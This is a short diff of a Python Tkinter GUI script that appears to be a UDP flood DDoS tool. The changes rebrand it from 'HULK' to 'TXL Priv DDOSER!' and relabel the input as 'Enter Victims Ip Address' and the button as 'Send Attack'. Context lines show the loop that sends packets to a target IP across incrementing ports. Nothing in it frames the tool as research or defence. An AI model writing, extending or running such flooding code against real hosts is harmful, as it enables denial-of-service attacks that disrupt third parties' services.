@@ -60,7 +60,7 @@ def attack():
         sock.sendto(bytes, (ip, port))
         sent = sent + 1
         port = port + 1
-        print("Sent %s packet to %s throught port:%s -by HULK" %
+        print("Sent %s packet to %s throught port:%s -by TXL" %
               (sent, ip, port))
         if port == 65534:
             port = 1
@@ -69,7 +69,7 @@ def attack():
 
 
 root = Tk()
-root.title("HULK- DDOS Attack Tool")
+root.title("TXL Priv DDOSER!")
 root.geometry("350x200+385+105")
 root.resizable(0, 0)
 
@@ -84,7 +84,7 @@ time()
 
 global E1
 global E2
-L1 = Label(root, text="ip address")
+L1 = Label(root, text="Enter Victims Ip Address")
 L1.pack(side=TOP)
 E1 = Entry(root)  # , bd =5)
 E1.pack(side=TOP)
@@ -95,6 +95,6 @@ L2.pack(side=TOP)
 E2 = Entry(root)  # , bd =5)
 E2.pack(side=TOP)
 
-button = Button(root, text="attack", command=attack).pack(
+button = Button(root, text="Send Attack", command=attack).pack(
     side=TOP)  # ,font=('comicsansms 19 bold')).pack(side=TOP)
 root.mainloop()
